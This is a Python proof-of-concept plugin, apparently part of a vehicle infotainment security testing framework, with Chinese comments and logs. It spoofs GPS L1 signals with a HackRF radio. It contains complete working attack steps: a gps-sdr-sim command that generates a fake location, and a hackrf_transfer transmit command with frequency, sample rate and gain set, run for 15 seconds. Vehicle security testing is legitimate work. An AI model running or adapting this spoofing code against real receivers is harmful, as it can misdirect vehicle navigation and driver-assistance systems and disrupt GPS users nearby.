"""
PoC Name: GPS Signal Spoofing
CVE: N/A
Component: ADAS / Navigation
Category: ADAS
Severity: High
CVSS: 7.0
Description: 使用HackRF广播伪造GPS L1信号，导致车辆定位偏移或ADAS功能受影响。
Prerequisites: 需安装 hackrf 驱动组件，连接 HackRF SDR 硬件，并预先使用 gps-sdr-sim 生成 gpssim.bin 信号源文件。
Usage: python3 56_GPS_Spoofing.py
"""
import os
import time
import subprocess
import shutil
from iv_plugin_base import IVIVulnerabilityPlugin

class GPSSpoofingPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        # 1. 检查是否存在hackrf工具
        if not shutil.which("hackrf_transfer"):
            self.logger.error("未找到 hackrf_transfer 工具。请先安装 HackRF 软件包 (如 sudo apt-get install hackrf)。")
            return False
            
        # 2. 预处理频率参数
        if not self.frequency:
            self.frequency = "1575420000" # 缺省使用 GPS L1 频段 1575.42 MHz (单位Hz)
        else:
            if "MHz" in self.frequency:
                freq = self.frequency.replace("MHz", "").strip()
                try:
                    self.frequency = str(int(float(freq) * 1000000))
                except ValueError:
                    self.frequency = "1575420000"
        return True

    def exploit(self):
        self.logger.info("准备执行 GPS 欺骗攻击 (HackRF Pcap/Bin Replay)...")
        
        # 3. 检查是否有预生成的基带信号文件
        bin_file = "gpssim.bin"
        if not os.path.exists(bin_file):
            self.logger.warning(f"未找到预生成的 GPS 基带信号文件：{bin_file}")
            self.logger.warning(">>> 提示：您可以使用 gps-sdr-sim 开源工具预先生成此文件。")
            self.logger.warning(">>> 示例：gps-sdr-sim -e brdc3540.14n -l 39.9042,116.4074,100 -b 8")
            return {
                "status": "error",
                "details": f"Missing payload baseband file: {bin_file}"
            }
            
        self.logger.info(f"Target Frequency: {self.frequency} Hz")
        self.logger.info("正在尝试连接 HackRF SDR 硬件设备并开始发射伪造信号...")
        
        # 构建 HackRF 发射命令
        cmd = [
            "hackrf_transfer",
            "-t", bin_file,
            "-f", self.frequency,
            "-s", "2600000",   # Sample rate for GPS sim is typically 2.6 Msps
            "-a", "1",         # Amp Enable
            "-x", "20"         # TX VGA Gain (0-47)
        ]
        
        try:
            self.logger.info(f"执行命令: {' '.join(cmd)}")
            
            # 使用 Popen 启动进程，以便中途能够主动终止
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # 等待 2 秒钟，检查进程是否因为找不到设备（如未插 USB 设备）而闪退
            time.sleep(2)
            if process.poll() is not None:
                stdout, stderr = process.communicate()
                out = stdout + stderr
                self.logger.error("HackRF 进程过早退出，执行失败！排查日志：")
                for line in out.splitlines():
                    self.logger.error(f"  {line}")
                    
                if "No HackRF boards found" in out or "not found" in out:
                    return {
                        "status": "error",
                        "vulnerable": False,
                        "details": "Hardware Error: HackRF SDR device is not connected or recognized via USB."
                    }
                return {
                    "status": "error",
                    "details": "HackRF transmission process failed to start."
                }
                
            # 若成功启动，我们将持续发射 15 秒作为 PoC 验证
            self.logger.info(">> HackRF 正在广播伪装出的 GPS 空间定位信号，将持续 15 秒钟...")
            for i in range(15):
                if process.poll() is not None:
                    break
                self.logger.info(f"Transmitting GPS signal... ({i+1}/15 sec)")
                time.sleep(1)
                
            # 时间到，安全终止发射以防持久干扰
            self.logger.info("PoC 演示时限结束，正在停止无线电发射...")
            process.terminate()
            process.wait(timeout=3)
            
            self.logger.info("[SUCCESS] \u6210\u529f\u5b8c\u6210 GPS \u4f2a\u9020\u4fe1\u53f7\u7684\u5e7f\u64ad\u3002")
            self.logger.info("\u82e5\u76ee\u6807\u8f66\u8f86(ADAS\u6a21\u5757/\u5bfc\u822a\u6a21\u5757)\u7f3a\u4e4f\u4fe1\u53f7DRM/\u5bc6\u7801\u5b66\u6821\u9a8c(OSNMA)\uff0c\u5176\u4f4d\u7f6e\u5750\u6807\u53ef\u80fd\u5df2\u88ab\u7be1\u6539\u3002")
            
            return {
                "status": "success",
                "vulnerable": True,
                "details": "Transmitted spoofed GPS signal locally using SDR. Manual visual verification on target IVI needed."
            }
                
        except Exception as e:
            self.logger.error(f"Execution Error: {str(e)}")
            return {
                "status": "error",
                "details": str(e)
            }

if __name__ == '__main__':
    plugin = GPSSpoofingPlugin()
    plugin.run()
